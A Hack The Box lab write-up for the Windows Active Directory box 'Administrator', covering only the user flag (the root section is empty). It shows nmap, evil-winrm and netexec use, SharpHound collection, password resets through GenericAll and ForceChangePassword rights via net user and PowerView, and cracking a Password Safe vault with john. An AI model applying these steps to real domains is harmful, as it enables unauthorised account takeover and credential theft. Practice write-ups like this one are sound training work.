# Key Takeaways
- If you have access to a user account, BloodHound is your best friend. (user.txt)
- 

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities


### Strengths


# Solving user.txt
This box is started out with user credentials for the user Olivia. I still started things out with the usual nmap scans to see what services would be available on the machine.
```
└──╼ $sudo nmap -sS -v -p- 10.10.11.42
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
51417/tcp open  unknown
53768/tcp open  unknown
53773/tcp open  unknown
53780/tcp open  unknown
53785/tcp open  unknown
53798/tcp open  unknown
```

We find that there are a decent amount of open ports, which was initially a bit overwhelming to decide what to focus on first. Considering that we already had user credentials, I figured it would be best if we could just immediately get remote access. To that end, port 5985 was looking like a solid choice as it might be possible to log in via a tool such as `evil-winrm`. Sure enough, I ran the following command and was able to get access as Olivia.
```bash
evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
```

Even though I now had access and could begin looking for privilege escalation vectors from this account, I didn't want to ignore the possible information I could receive from the other open ports.
I tried logging into FTP.
```
└──╼ $ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:bored): Olivia
331 Password required
Password:
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> exit
221 Goodbye.
```

I tried zone transferring from the DNS server.
```
└──╼ $dig axfr administrator.htb @10.10.11.42

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr administrator.htb @10.10.11.42
;; global options: +cmd
; Transfer failed.
```

I tried seeing if there were any interesting SMB shares available.
```
└──╼ $netexec smb 10.10.11.42 -u Olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

None of this returned anything interesting. At this point, it felt like time to start looking for privilege escalation vectors while logged into the Olivia account. Initially, I ran through a lot of the standard checks— looking for services with interesting permissions, looking for custom software, checking user and group privileges, among other things. However, something I can take away from this box is that if you have access to run BloodHound in an AD environment, do it right away as it would have saved me some time here.

I eventually uploaded a legacy BloodHound executable via WinRM, and then executed it to collect AD information.
```
*Evil-WinRM* PS C:\Users\olivia\Documents> upload SharpHound_v1.exe

Info: Uploading ./SharpHound_v1.exe to C:\Users\olivia\Documents\SharpHound_v1.exe

Data: 1402880 bytes of 1402880 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\olivia\Documents> .\SharpHound_v1.exe -c All --zipfilename administrator

 57 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-12-22T04:36:34.8652644-08:00|INFORMATION|SharpHound Enumeration Completed at 4:36 AM on 12/22/2025! Happy Graphing!
```

I then transferred this zip file back to my local machine and began to analyze the results in BloodHound. I right away opened the node for Olivia. I noticed that she has a GenericAll ACE over the user Michael.
<img width="921" height="116" alt="image" src="https://github.com/user-attachments/assets/5fa57643-771a-4bf6-aefa-7fb93187d76a" />

GenericAll gives the user complete control over the targeted object. With this in mind, I used this access to change the password of the Michael user with the `net` command.
```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Noodles333
The command completed successfully.
```

Before attempting to log in as Michael, I first went back to BloodHound. I noticed that Michael has a ForceChangePassword ACE over the user Benjamin.
<img width="912" height="127" alt="image" src="https://github.com/user-attachments/assets/4ab9ae5a-c56e-4a72-9423-b9b04c129f7d" />

I attempted to use the `net` command as I did with Michael, however this failed. I instead used PowerView to set the password.
```
*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1

Info: Uploading ./PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\michael\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\michael\Documents> $secPassword = ConvertTo-SecureString 'Noodles444' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $secPassword -Verbose
Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'benjamin'
Verbose: [Set-DomainUserPassword] Password for user 'benjamin' successfully reset
```

Inspecting the Benjamin user in BloodHound, the only thing that really stood out was its membership to the Share Moderators group. Due to this membership, it seems like a worthwhile idea to enumerate any network shares from this account including FTP and SMB.
<img width="771" height="298" alt="image" src="https://github.com/user-attachments/assets/c2d34a2a-13cc-4525-bdc5-c75daab268ab" />

SMB shares with access as Benjamin didn't look any more interesting.
```
└──╼ $netexec smb 10.10.11.42 -u benjamin -p Noodles444 --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:Noodles444
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

FTP access does have an interesting `Backup.psafe3` file.
```
└──╼ $ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:bored): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||55169|)
150 Opening ASCII mode data connection.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
```

I used `pwsafe2john` to pull the masterkey hash from the file, and the tried to crack it via John the Ripper. This cracked the password vault key and allowed us to gain access.
```
└──╼ $pwsafe2john Backup.psafe3 > Backup.hash

(testenv) ┌─[bored@parrot]─[~/boxes/Administrator]
└──╼ $john -w=/usr/share/wor└──╼ $john -w=/usr/share/wordlists/rockyou.txt Backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)
```

I then installed "passwordsafe" and accessed the vault by selecting the Backup.psafe3 file and inputting the password.
```
└──╼ $sudo apt install passwordsafe
└──╼ $pwsafe
```

We are given three user's and their passwords.
<img width="500" height="353" alt="image" src="https://github.com/user-attachments/assets/cbf857d5-6b06-4132-a5d9-564deff085a7" />

I copied each password out and inspected the users in BloodHound.



# Solving root.txt
